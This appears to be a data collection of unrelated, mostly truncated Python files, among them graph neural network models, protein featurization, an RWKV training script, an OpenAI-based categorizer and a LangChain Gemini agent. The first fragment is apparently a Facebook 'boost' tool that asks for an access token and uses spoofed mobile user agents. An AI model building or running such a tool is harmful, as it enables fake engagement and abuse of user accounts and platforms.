'''\u001b[1;33m'''\nF = '''\u001b[2;32m'''\nC = '''\u001b[1;97m'''\nB = '''\u001b[2;36m'''\nY = '''\u001b[1;34m'''\nE = '''\u001b[1;31m'''\nB = '''\u001b[2;36m'''\nG = '''\u001b[1;32m'''\nS = '''\u001b[1;33m'''\nZ = '''\u001b[1;31m'''\nX = '''\u001b[1;33m'''\nF = '''\u001b[2;32m'''\nC = '''\u001b[1;97m'''\nB = '''\u001b[2;36m'''\nY = '''\u001b[1;34m'''\nC = '''\u001b[1;97m'''\nE = '''\u001b[1;31m'''\nB = '''\u001b[2;36m'''\nG = '''\u001b[1;32m'''\nS = '''\u001b[1;33'''\nprint(F + '''FACE''' + F + '\ud835\ude71\ud835\ude7e\ud835\ude7e\ud835\ude7a ' + F + 'To' + F + 'ol' + Z)\nprint(F + '\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae')\nprint(F + '\u27a8 ' + Y + 'BY ' + E + '@XD_0O' + X + '| @XD_0O' + Z)\nprint(F + '\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9')\nprint('''\n''')\ntoken = input(B + 'token\u27a4\u062a\u06c1\u0648\u0643\u06c1\u0646\u06c1\u0643 : ' + X)\nprint('''\n''')\nID = input(B + 'ID\u27a4\u0622\u064a\u06c1\u062f\u064a\u06c1\u0643    : ' + R)\npretty.install()\nCON = sol()\nuser_agent = [\n    '''Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]''',\n    '''Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]''',\n    '''Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Build/RQ2A.210305.006; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Ge",
    "import torch\nimport torch.nn.functional as F\nfrom torch.nn import Sequential, Linear, ReLU, BatchNorm1d as BN\nfrom torch_geometric.nn import GINConv, global_mean_pool\n\n\nclass GIN(torch.nn.Module):\n    def __init__(self, dataset, num_layers, hidden):\n        super().__init__()\n        self.conv1 = GINConv(\n            Sequential(\n                Linear(79, hidden),\n                # Linear(dataset.num_features, hidden),\n                ReLU(),\n                Linear(hidden, hidden),\n                ReLU(),\n                BN(hidden),\n            ),\n            train_eps=True,\n        )\n        self.convs = torch.nn.ModuleList()\n        for i in range(num_layers - 1):\n            self.convs.append(\n                GINConv(\n                    Sequential(\n                        Linear(hidden, hidden),\n                        ReLU(),\n                        Linear(hidden, hidden),\n                        ReLU(),\n                        BN(hidden),\n                    ),\n                    train_eps=True,\n                )\n            )\n        self.lin1 = Linear(hidden, hidden)\n        self.lin2 = Linear(hidden, 50)\n        # self.lin2 = Linear(hidden, dataset.num_classes)\n\n    def reset_parameters(self):\n        self.conv1.reset_parameters()\n        for conv in self.convs:\n            conv.reset_parameters()\n        self.lin1.reset_parameters()\n        self.lin2.reset_parameters()\n\n    def forward(self, data, ret_repr=False):\n        x, edge_index, batch = data.x, data.edge_index, data.batch\n        x = self.conv1(x, edge_index)\n        for conv in self.convs:\n            x = conv(x, edge_index)\n        x_repr = global_mean_pool(x, batch)\n        if ret_repr:\n            return x_repr\n        x = F.relu(self.lin1(x_repr))\n        x = F.dropout(x, p=0.5, training=self.training)\n        x = self.lin2(x)\n        return F.log_softmax(x, dim=-1)\n\n    def __repr__(self):\n        return self.__class__.__name__\n\n\nclass ContraGIN(torch.nn.Module):\n    def __init__(self, dataset, num_layers, hidden):\n        super().__init__()\n        self.gin = GIN(dataset, num_layers, hidden)\n\n    def forward(self, precursor_data, product_data, ret_repr=False):\n        precursor_outputs = []\n        product_outputs = []\n\n        for prec_data in precursor_data:\n            precursor_outputs.append(self.gin(prec_data, ret_repr))\n\n        for prod_data in product_data:\n            product_outputs.append(self.gin(prod_data, ret_repr))\n\n        return precursor_outputs, product_outputs\n",
    "import requests\nfrom colorama import Fore, Style\nimport json\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\n\ntoken = 'YOUR_TOKEN'\n\ndef send_request(device_id):\n    url = f'https://api.io.solutions/v1/io-explorer/devices/{device_id}/summary'\n    headers = {\"Token\": token}\n    response = requests.get(url, headers=headers)\n    return device_id, response\n\ndef choose_group():\n    groups = list(set([server[\"group\"] for server in data]))\n    groups.append(\"all\")\n    groups.sort()\n    \n    print(\"Select group:\")\n    for i, group in enumerate(groups):\n        print(f\"{i+1}. {group}\")\n    \n    choice = input(\"Enter group number: \")\n    if choice == \"0\":\n        return None\n    elif choice == str(len(groups)):\n        return \"all\"\n    elif choice.isdigit() and int(choice) <= len(groups):\n        return groups[int(choice)-1]\n    else:\n        print(\"Invalid choice. Please try again.\")\n        return choose_group()\n\nexecutor = ThreadPoolExecutor(max_workers=10)\n\ndevice_ids = []\n\n# Read device IDs from JSON file\nwith open('servers.json', 'r') as file:\n    data = json.load(file)\n    for device in data:\n        device_ids.append(device['device_id'])\n\n# Filter device IDs by group\ngroup = choose_group()\nif group is not None and group != \"all\":\n    device_ids = [device['device_id'] for device in data if device['group'] == group]\n\nfutures = []\n\nfor device_id in device_ids:\n    future = executor.submit(send_request, device_id)\n    futures.append(future)\n\nfor future in as_completed(futures):\n    device_id, response = future.result()\n\n    if response.status_code == 200:\n        response_json = response.json()\n\n        if 'data' in response_json:\n            status = response_json['data']['status']\n            status_duration = response_json['data']['status_duration']\n\n            print(f\"Device ID: {device_id}\")\n\n            if status == \"up\":\n                print(f\"Status: {Fore.GREEN}Running{Style.RESET_ALL}\")\n            elif status == \"down\":\n                device = next((device for device in data if device['device_id'] == device_id), None)\n                if device:\n                    device_name = device['device_name']\n                    group = device['group']\n                    print(f\"Status: {Fore.RED}{status}{Style.RESET_ALL}\")\n                    print(f\"Device Name: {device_name}\")\n                    print(f\"Group: {group}\")\n                else:\n                    print(f\"Status: {Fore.RED}{status}{Style.RESET_ALL}\")\n            else:\n                print(f\"Status: {Fore.YELLOW}{status}{Style.RESET_ALL}\")\n\n            if status_duration:\n                print(f\"Status Duration: {status_duration}\")\n\n            print()\n        else:\n            print(f\"Device ID: {device_id}\\n{response_json}\\n\")\n    else:\n        print(f\"Device ID: {device_id}\\nError: API request failed with status code {response.status_code}\\n\")",
    "import os\nimport numpy as np\nimport pandas as pd\nimport scipy as sp\nimport networkx as nx\nimport multiprocessing\nimport torch\nimport torch_geometric as pyg\n\nfrom rdkit import Chem\nfrom rdkit.Chem import rdFreeSASA\n\nfrom log.logger import Logger\n\nnp.set_printoptions(threshold=np.inf)\ntorch.set_printoptions(profile=\"full\")\n\n\n'''\none_hot:\n    about:\n        function for one-hot encoding\n\n    params:\n        val = value\n        set = set of possible values\n\n    returns:\n        one-hot vector with index of val set to 1\n'''\ndef one_hot(val, set):\n\n    if val not in set:\n        val = set[0]\n    \n    return list(map(lambda s: val == s, set))\n\n\n'''\nget_nodes:\n    about:\n        gets node and node feature tensor for a labeled protein using RDKit to determine relevant physiochemical features\n\n    params:\n        protein_chain = RDKit mol data file for protein chain\n\n    returns:\n        x = torch tensor of node and node features\n'''\ndef get_nodes(protein_chain):\n\n    G = nx.Graph()\n\n    atoms = protein_chain.GetAtoms() # iterate over all atoms in protein chain\n\n    ptable = Chem.GetPeriodicTable()\n    vdw_radii = [ptable.GetRvdw(atom.GetAtomicNum()) for atom in protein_chain.GetAtoms()] # get Van der Waals radii for all atoms in protein chain\n    rdFreeSASA.CalcSASA(protein_chain, vdw_radii) # compute solvent-accessible surface area (SASA) for all atoms in protein\n\n    sasa = []\n    surface_accessible = []\n\n    for i in range(len(atoms)):\n\n        atom = atoms[i]\n        atom_index = atom.GetIdx()\n\n        # ELEMENT SYMBOL [other, C, N, O, P, S, F, CL, Br, I]\n        element_symbol = one_hot(atom.GetSymbol(), ['Other','C','N','O','P','S'])\n        \n        # DEGREE [0, 1, 2, 3, 4, 5, 6, 7]\n        degree = one_hot(atom.GetDegree(), [0, 1, 2, 3, 4, 5, 6, 7])\n\n        # FORMAL CHARGE [0, 1, 2, -1, -2]\n        formal_charge = one_hot(atom.GetFormalCharge(), [0, 1, 2, -1, -2])\n        \n        # RADICAL ELECTRONS [0, >=1]\n        radical_electrons = one_hot(atom.GetNumRadicalElectrons(), [0, 1])\n\n        # IMPLICIT VALENCE [0, 1, 2, 3, 4, 5, 6]\n        implicit_valence = one_hot(atom.GetImplicitValence(), [0, 1, 2, 3, 4, 5, 6])\n\n        # IMPLICIT HYDROGENS [0, 1, 2, 3, 4]\n        implicit_hydrogens = one_hot(atom.GetNumImplicitHs(), [0, 1, 2, 3, 4])\n\n        # HYBRIDIZATION [SP, SP2, SP3, SP3D, SP3D2]\n        hybridization = one_hot(atom.GetHybridization(), [Chem.HybridizationType.SP,\n                                                          Chem.HybridizationType.SP2,\n                                                          Chem.HybridizationType.SP3,\n                                                          Chem.HybridizationType.SP3D,\n                                                          Chem.HybridizationType.SP3D2])\n        \n        # AROMATIC [0/1]\n        aromatic = atom.GetIsAromatic()\n\n        # SASA [FLOAT] (NON-FEATURE TENSOR)\n        a = float(atom.GetProp('SASA'))\n        sasa.append(a)\n\n        # SURFACE ACCESSIBLE [0/1] (NON-FEATURE TENSOR)\n        surface_accessible.append(a > 0)\n\n        features = np.hstack((element_symbol,\n                              degree,\n                              formal_charge,\n                              radical_electrons,\n                              implicit_valence,\n                              implicit_hydrogens,\n                              hybridization,\n                              aromatic)) # combine all 39 features into one vector and add to graph\n\n        G.add_node(atom_index, feats=torch.from_numpy(features))\n\n    x = torch.stack([feats['feats'] for n, feats in G.nodes(data=True)]).float() # convert to tensor\n    sasa = torch.tensor(sasa) # conver to tensor\n    surface_accessible = torch.tensor(surface_accessible) # convert to tensor\n\n    return x, sasa, surface_accessible\n\n\n'''\nget_edges:\n    about:\n        gets edge and edge feature tensor for a protein using RDKit to determine relevant physiochemical features\n\n    params:\n        protein_chain = RDKit mol data file for protein chain\n        radius_ncov = cutoff radius for determining non-covalent edges around an atom in Angstroms\n\n    returns:\n        edge_index = torch tensor of edge indices\n        edge_attr = torch tensor of edge features\n'''\ndef get_edges(protein_chain, radius_ncov, ncov_within_residue):\n\n    G = nx.Graph()\n\n    pos = protein_chain.GetConformers()[0].GetPositions() # get atomic coordinates\n    dist_matrix = sp.spatial.distance_matrix(pos, pos) # calculate distances between all atoms\n\n    # GET COVALENT INTERACTIONS\n    for bond in protein_chain.GetBonds():\n        i = bond.GetBeginAtomIdx()\n        j = bond.GetEndAtomIdx()\n        \n        G.add_edge(i, j, type=1, dist=dist_matrix[i, j])\n\n    # GET NON-COVALENT INTERACTIONS\n    ncov_idx = np.where((dist_matrix <= radius_ncov))\n\n    for i, j in zip(ncov_idx[0], ncov_idx[1]):\n        i = int(i)\n        j = int(j)\n\n        if ncov_within_residue == False:\n            atom_i = protein_chain.GetAtomWithIdx(i)\n            atom_j = ",
    "import pandas as pd\nimport numpy as np\nfrom openai import OpenAI # openai version: 1.6.1\nimport tiktoken \nimport re # package for removing special characters strings \nimport json\nimport random\nfrom openai import AsyncOpenAI \nimport asyncio \nimport sys \nimport datetime as datetime\nimport fsspec\nimport s3fs\nimport time\nimport os\n\n########################################### Pre API Call Processing Functions  ##############################################################################\n\n\n# helper functions to count number of tokens in each text value \ndef num_tokens_from_string(string: str, encoding_name: str) -> int:\n    \"\"\"Returns the number of tokens in a text string.\"\"\"\n    encoding = tiktoken.get_encoding(encoding_name)\n    num_tokens = len(encoding.encode(string))\n    return num_tokens\n\ndef remove_special_characters(text):\n    \"\"\"Returns only the non special characters within a string\"\"\"\n    text = str(text)\n    pattern = r'[^a-zA-Z0-9\\s]' # This pattern will remove anything that is not alphanumeric or whitespace\n    clean_text = re.sub(pattern, '', text)\n    return clean_text\n\n\ndef collapse_text_values_to_csv_groups(data, text_variable, tokens_per_group): \n    \"\"\"Groups together the text values into groups no bigger then the tokens per groups\n        Must already have `text_value_id` column\"\"\"\n    \n    print(\"collapsing raw text values into .csv groups for api call\")\n\n    # remove special characters from the text data \n    data['text_values_clean'] = data[text_variable].apply(lambda x: remove_special_characters(x))\n\n    # create a column with the count of tokens in each text value \n    data['token_count'] = data[\"text_values_clean\"].apply(lambda x: num_tokens_from_string(x, \"cl100k_base\")) \n\n    # create a column that is the cumulative sum of the token column \n    data['token_count_cumsum'] = data['token_count'].cumsum()\n\n    # use the interger division operator to create api call groups \n    data['api_call_group'] = data['token_count_cumsum'] // tokens_per_group\n\n    # add id to text value \n    data['text_values_clean'] = data['text_value_id'].astype(str) + \" \" + data['text_values_clean'] \n\n    # keep variable(s) to be used to be feed into chatgpt\n    prep_data = data[[\"text_values_clean\", \"api_call_group\"]]\n\n    # group by text values \n    prep_data = prep_data.groupby('api_call_group').agg({'text_values_clean': lambda x: ', '.join(map(str, x))})\n\n    return prep_data \n\ndef create_category_id_key(categories_df): \n    \n    print('creating category id key to keep track of categories gpt chooses')\n    categories_df = categories_df.reset_index()\n\n    # create a unique id for each category (always 2 digit number)\n    categories_df['category_id'] = categories_df.index + 10\n\n    # TODO: add a warning if the number of categories exceeds 90\n    return categories_df\n\ndef create_system_instructions(gpt_directions, category_id_key, other_category): \n    \"\"\"takes in the gpt_directions defined by the user and the category_id_key defined earlier\"\"\"\n    print('bind together system instructions based on user inputs')\n    \n    if other_category == True: \n        other = \"If you are uncertain, then choose 99 for the 'Other' category.\\n\"\n        other_category = \"\\n - Other (99)\\n\"\n    else: \n        other = \"The 'Other' category is not applicable for this prompt. Please select the most appropriate category from the provided options.\\n\"\n        other_category = \"\"\n    # turn categories list into one string with the category id attatched \n    # attatched the unique id for each category to the end of the category string \n    category_id_key['category_clean'] = \"- \" + category_id_key['category'] + \" (\" + category_id_key['category_id'].astype(str) + \")\"\n\n    # select only category clean \n    category_id_key = category_id_key[['category_clean']]\n\n    # collapse categories down into one string value \n    category_id_key['group'] = 1 \n    categories_string = category_id_key.groupby('group').agg({'category_clean': lambda x: '\\n '.join(map(str, x))})\n    categories_string = categories_string['category_clean'][1]\n\n    json_request = '''You will output this as a JSON document {expense id:category id number}\\n'''\n    \n    # Join together entire system instructions\n    system_instructions = gpt_directions +  other + json_request + categories_string + other_category\n\n    return system_instructions\n\n########################################### Post API Call Processing Functions  ##############################################################################\n\ndef extract_raw_logprob_data(logprobs_content, output):\n\n     # Create empty lists to be filled with the logprob content \n    token_list = []\n    logprob_list = []  \n\n    # loop through logprobs content, each item is a list for each token\n    for item in logprobs_content: \n        # select the top log probs section which contains the data we want for each token \n        topLogprobs = item.top_logprobs[0]\n        # loop through each top log probs list for each token\n        for topLog",
    "from logifyr import Logifyr\nif __name__ == \"__main__\":\n    # Create an instance of Logifyr\n    logger = Logifyr()\n    # Test the log function with different statuses\n    logger.print_log(\"INFO\", \"This is an informational message.\")\n    logger.print_log(\"WARNING\", \"This is a warning!\")\n    logger.print_log(\"ERROR\", \"An error occurred!\")\n    logger.print_log(\"DEBUG\", \"Debugging information.\")\n    # Customize status colors (example)\n    logger.set_status_color(\"INFO\", \"cyan\")\n    logger.set_status_color(\"WARNING\", \"magenta\")\n    # Test with customized status colors\n    logger.print_log(\"INFO\", \"This is a customized informational message.\")\n    logger.print_log(\"WARNING\", \"This is a customized warning!\")\n    # Disable colorized output\n    logger.disable_color()\n    logger.print_log(\"INFO\", \"This message should not be colorized.\")\n    logger.enable_color()\n    # Set a different timestamp format\n    logger.set_timestamp_format(\"%Y/%m/%d %H:%M:%S\")\n    # Test with the new timestamp format\n    logger.print_log(\"INFO\", \"This message has a custom timestamp format.\")\n    # Set a another timestamp format\n    logger.set_timestamp_format(\"%m/%d/%Y %I:%M %p\")\n    # Test with the another timestamp format\n    logger.print_log(\"INFO\", \"This message has another custom timestamp format.\")",
    "########################################################################################################\n# The RWKV Language Model - https://github.com/BlinkDL/RWKV-LM\n########################################################################################################\n\nimport logging\nlogging.basicConfig(level=logging.INFO)\n\nif __name__ == \"__main__\":\n    from argparse import ArgumentParser\n    from pytorch_lightning import Trainer\n    from pytorch_lightning.utilities import rank_zero_info, rank_zero_only\n    import pytorch_lightning as pl\n\n    rank_zero_info(\"########## work in progress ##########\")\n\n    parser = ArgumentParser()\n\n    parser.add_argument(\"--load_model\", default=\"\", type=str)  # full path, with .pth\n    parser.add_argument(\"--wandb\", default=\"\", type=str)  # wandb project name. if \"\" then don't use wandb\n    parser.add_argument(\"--proj_dir\", default=\"out\", type=str)\n    parser.add_argument(\"--random_seed\", default=\"-1\", type=int)\n\n    parser.add_argument(\"--data_file\", default=\"\", type=str)\n    parser.add_argument(\"--data_type\", default=\"utf-8\", type=str)\n    parser.add_argument(\"--vocab_size\", default=0, type=int)  # vocab_size = 0 means auto (for char-level LM and .txt data)\n\n    parser.add_argument(\"--ctx_len\", default=1024, type=int)\n    parser.add_argument(\"--epoch_steps\", default=1000, type=int)  # a mini \"epoch\" has [epoch_steps] steps\n    parser.add_argument(\"--epoch_count\", default=500, type=int)  # train for this many \"epochs\". will continue afterwards with lr = lr_final\n    parser.add_argument(\"--epoch_begin\", default=0, type=int)  # if you load a model trained for x \"epochs\", set epoch_begin = x\n    parser.add_argument(\"--epoch_save\", default=5, type=int)  # save the model every [epoch_save] \"epochs\"\n\n    parser.add_argument(\"--micro_bsz\", default=1, type=int)  # micro batch size (batch size per GPU) maybe not working on lisa\n    parser.add_argument(\"--n_layer\", default=6, type=int)\n    parser.add_argument(\"--n_embd\", default=512, type=int)\n    parser.add_argument(\"--dim_att\", default=0, type=int)\n    parser.add_argument(\"--dim_ffn\", default=0, type=int)\n    parser.add_argument(\"--pre_ffn\", default=0, type=int)  # replace first att layer by ffn (sometimes better)\n    parser.add_argument(\"--head_qk\", default=0, type=int)  # my headQK trick\n    parser.add_argument(\"--tiny_att_dim\", default=0, type=int)  # tiny attention dim\n    parser.add_argument(\"--tiny_att_layer\", default=-999, type=int)  # tiny attention @ which layer\n\n    parser.add_argument(\"--lr_init\", default=1e-4, type=float)  # 6e-4 for L12-D768, 4e-4 for L24-D1024, 3e-4 for L24-D2048\n    parser.add_argument(\"--lr_final\", default=1e-5, type=float)\n    parser.add_argument(\"--warmup_steps\", default=-1, type=int)  # try 50 if you load a model\n    parser.add_argument(\"--beta1\", default=0.9, type=float)\n    parser.add_argument(\"--beta2\", default=0.99, type=float)  # use 0.999 when your model is close to convergence\n    parser.add_argument(\"--adam_eps\", default=1e-8, type=float)\n    parser.add_argument(\"--grad_cp\", default=1, type=int)  # gradient checkpt: saves VRAM, but slower\n    parser.add_argument(\"--dropout\", default=0, type=float) # try 0.01 / 0.02 / 0.05 / 0.1\n    parser.add_argument(\"--weight_decay\", default=0, type=float) # try 0.1 / 0.01 / 0.001\n    parser.add_argument(\"--weight_decay_final\", default=-1, type=float)\n\n    parser.add_argument(\"--my_pile_version\", default=1, type=int)  # my special pile version\n    parser.add_argument(\"--my_pile_stage\", default=0, type=int)  # my special pile mode\n    parser.add_argument(\"--my_pile_shift\", default=-1, type=int)  # my special pile mode - text shift\n    parser.add_argument(\"--my_pile_edecay\", default=0, type=int)\n    parser.add_argument(\"--layerwise_lr\", default=1, type=int)  # layerwise lr for faster convergence (but slower it/s)\n    parser.add_argument(\"--ds_bucket_mb\", default=200, type=int)  # deepspeed bucket size in MB. 200 seems enough\n    # parser.add_argument(\"--cuda_cleanup\", default=0, type=int)  # extra cuda cleanup (sometimes helpful)\n\n    parser.add_argument(\"--my_sample_len\", default=0, type=int)\n    parser.add_argument(\"--my_ffn_shift\", default=1, type=int)\n    parser.add_argument(\"--my_att_shift\", default=1, type=int)\n    parser.add_argument(\"--head_size_a\", default=64, type=int) # can try larger values for larger models\n    parser.add_argument(\"--head_size_divisor\", default=8, type=int)\n    parser.add_argument(\"--my_pos_emb\", default=0, type=int)\n    parser.add_argument(\"--load_partial\", default=0, type=int)\n    parser.add_argument(\"--magic_prime\", default=0, type=int)\n    parser.add_argument(\"--my_qa_mask\", default=0, type=int)\n    parser.add_argument(\"--my_random_steps\", default=0, type=int)\n    parser.add_argument(\"--my_testing\", default='', type=str)\n    parser.add_argument(\"--my_exit\", default=99999999, type=int)\n    parser.add_argument(\"--my_exit_tokens\", default=0, type=int)\n    \n    parser.add_argument(\"--lisa\", default=1, type=int) #if 1 ena",
    "import torch\nfrom dataloader import ImageDataset\nfrom model import Model\nimport torch.nn as nn\nimport torch.optim as optim\nfrom torch.utils.data import DataLoader\nfrom tqdm import tqdm\nimport matplotlib.pyplot as plt\n\n\ndef calculate_metrics(model, dataloader, device, criterion):\n    model.eval()  # \u8bbe\u7f6e\u6a21\u578b\u4e3a\u8bc4\u4f30\u6a21\u5f0f\n    correct = 0\n    total = 0\n    total_loss = 0.0\n    with torch.no_grad():\n        for inputs, labels in dataloader:\n            inputs, labels = inputs.to(device), labels.to(device)\n            outputs = model(inputs)\n            loss = criterion(outputs, labels)  # \u8ba1\u7b97\u635f\u5931\n            total_loss += loss.item()  # \u7d2f\u52a0\u635f\u5931\n            _, predicted = torch.max(outputs.data, 1)\n            total += labels.size(0)\n            correct += (predicted == labels).sum().item()\n    avg_loss = total_loss / len(dataloader)\n    accuracy = 100 * correct / total\n    return avg_loss, accuracy\n\n\ndef plot_and_save_metrics(train_losses, val_losses, train_accuracies, val_accuracies, filename='training_metrics.png'):\n    plt.figure(figsize=(16, 6))\n\n    plt.subplot(1, 2, 1)\n    plt.plot(train_losses, label='Train Loss')\n    plt.plot(val_losses, label='Validation Loss')\n    plt.title('Training and Validation Loss')\n    plt.xlabel('Epoch')\n    plt.ylabel('Loss')\n    plt.legend()\n\n    plt.subplot(1, 2, 2)\n    plt.plot(train_accuracies, label='Train Accuracy')\n    plt.plot(val_accuracies, label='Validation Accuracy')\n    plt.title('Training and Validation Accuracy')\n    plt.xlabel('Epoch')\n    plt.ylabel('Accuracy')\n    plt.legend()\n\n    plt.tight_layout()\n    plt.savefig(filename)\n    plt.show()\n\n\n\nif __name__ == \"__main__\":\n    device = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\")\n\n    model = Model(58)\n    model.to(device)\n\n    criterion = nn.CrossEntropyLoss()\n    optimizer = optim.Adam(model.parameters(), lr=0.001)\n\n    train_data = ImageDataset(\n        annotations_file=r'C:\\Users\\JAN\\Desktop\\Traffic annotation classification\\Traffic annotation classification\\data\\train_data.csv',\n        img_dir=r'C:\\Users\\JAN\\Desktop\\Traffic annotation classification\\Traffic annotation classification\\data\\images'\n    )\n\n    val_data = ImageDataset(\n        annotations_file=r'C:\\Users\\JAN\\Desktop\\Traffic annotation classification\\Traffic annotation classification\\data\\val_data.csv',\n        img_dir=r'C:\\Users\\JAN\\Desktop\\Traffic annotation classification\\Traffic annotation classification\\data\\images'\n    )\n\n    train_dataloader = DataLoader(train_data, batch_size=160, shuffle=True)\n    val_dataloader = DataLoader(val_data, batch_size=160, shuffle=True)\n\n    num_epochs = 25\n    train_losses, val_losses, train_accuracies, val_accuracies = [], [], [], []\n    best_val_accuracy = 0\n\n    for epoch in range(num_epochs):\n        model.train()  # \u8bbe\u7f6e\u6a21\u578b\u4e3a\u8bad\u7ec3\u6a21\u5f0f\n        running_loss = 0.0\n        for imgs, labels in tqdm(train_dataloader, desc=f'Epoch {epoch + 1}/{num_epochs}'):\n            imgs, labels = imgs.to(device), labels.to(device)\n\n            optimizer.zero_grad()  # \u68af\u5ea6\u6e05\u96f6\n            outputs = model(imgs)  # \u524d\u5411\u4f20\u64ad\n            loss = criterion(outputs, labels)  # \u8ba1\u7b97\u635f\u5931\n            loss.backward()  # \u53cd\u5411\u4f20\u64ad\n            optimizer.step()  # \u66f4\u65b0\u6743\u91cd\n\n            running_loss += loss.item()\n\n        # \u8ba1\u7b97\u8bad\u7ec3\u96c6\u548c\u9a8c\u8bc1\u96c6\u7684\u51c6\u786e\u7387\n        train_loss, train_accuracy = calculate_metrics(model, train_dataloader, device, criterion)\n        train_losses.append(train_loss)\n        train_accuracies.append(train_accuracy)\n\n        val_loss, val_accuracy = calculate_metrics(model, val_dataloader, device, criterion)\n        val_losses.append(val_loss)\n        val_accuracies.append(val_accuracy)\n\n        if val_accuracy > best_val_accuracy:\n            best_val_accuracy = val_accuracy\n            # \u4fdd\u5b58\u6a21\u578b\n            torch.save(model.state_dict(), r'C:\\Users\\JAN\\Desktop\\Traffic annotation classification\\Traffic annotation classification\\save_model\\best_model.pt')\n            print(f\"New best model saved with val_accuracy: {best_val_accuracy}%\")\n\n        print(f\"Loss: {running_loss / len(train_dataloader)}, \"\n              f\"Train Accuracy: {train_accuracy}%, Val Accuracy: {val_accuracy}%\")\n\n    plot_and_save_metrics(train_losses, val_losses, train_accuracies, val_accuracies, 'metrics.png')\n    print('Finished Training')\n",
    "from typing import Optional, List, Tuple\nimport logging\nfrom sqlalchemy.exc import SQLAlchemyError\n\nfrom langchain.agents import AgentExecutor\nfrom langchain.agents.format_scratchpad import format_to_openai_function_messages\nfrom langchain.agents.output_parsers import OpenAIFunctionsAgentOutputParser\n\nfrom langchain_core.messages import AIMessage, HumanMessage\nfrom langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder\nfrom langchain_core.pydantic_v1 import BaseModel, Field\nfrom langchain_google_genai import ChatGoogleGenerativeAI\nfrom langchain.prompts import HumanMessagePromptTemplate\nfrom langchain_core.messages import SystemMessage\nfrom langchain.tools import Tool\nfrom langchain_community.utilities import GoogleSearchAPIWrapper\nimport json\n\nfrom sqlalchemy import desc\nfrom sqlalchemy.orm import Session\nfrom fastapi import FastAPI,HTTPException,status, Depends\nfrom database.db import get_db\n\nfrom schema.users_shema import user\nimport oauth\nfrom sqlalchemy import func\n\nimport jsonpickle\nimport os\nfrom dotenv import load_dotenv\nimport uuid\n\nfrom model.users_model import User, ChatHistory\nfrom model import users_model\n\nfrom .prompt import gemini_search_prompt\n\nfrom datetime import datetime\n\nlogger = logging.getLogger(__name__)\n\nload_dotenv()\n\ngemini_api_key = os.getenv(\"GEMINI_API_KEY\")\ngoogle_cse_id = os.getenv(\"GOOGLE_CSE_ID\")\ngoogle_api_key = os.getenv(\"GOOGLE_API_KEY\")\n\n\nclass Gemini:\n    def __init__(self, old_session: Optional[Session] = None, db: Session = Depends(get_db), current_user: user = Depends(oauth.get_current_user)):\n        self.description = gemini_search_prompt\n        self.db = db\n        self.current_user = current_user\n        self.agent_executor = None\n\n        if old_session != None:\n            self.session = old_session\n            print(old_session.conversation_id)\n\n        else:\n            self.create_new_session()\n            print(f\"new session {self.session.conversation_id}\")\n\n\n    def create_new_session(self):\n        new_session = users_model.Session(\n            user_id=self.current_user.id,\n            conversation_id=f\"user_{self.current_user.id}_{str(uuid.uuid4())}\"\n        )\n        self.db.add(new_session)\n        self.db.commit()\n        self.session = new_session\n\n\n    def _get_current_user(self):\n        try:\n            chat_history = self.db.query(User).filter(self.current_user.id == User.id).first()\n            print(chat_history)\n            return chat_history\n\n        except Exception as e:\n            #logger.error(f\"Error fetching user from DB: {e}\")\n            print(f\"Error fetching user from DB: {e}\")\n            return f\"Error fetching user from DB: {e}\"\n\n\n    def google_search(self):\n\n        try:\n            search = GoogleSearchAPIWrapper(google_api_key=google_api_key, google_cse_id=google_cse_id)\n\n            google_tool = Tool(\n                name = \"google_search\",\n                description = self.description,\n                func = search.run,\n            )\n            return [google_tool]\n            \n        except Exception as e:\n            print(f\"Error 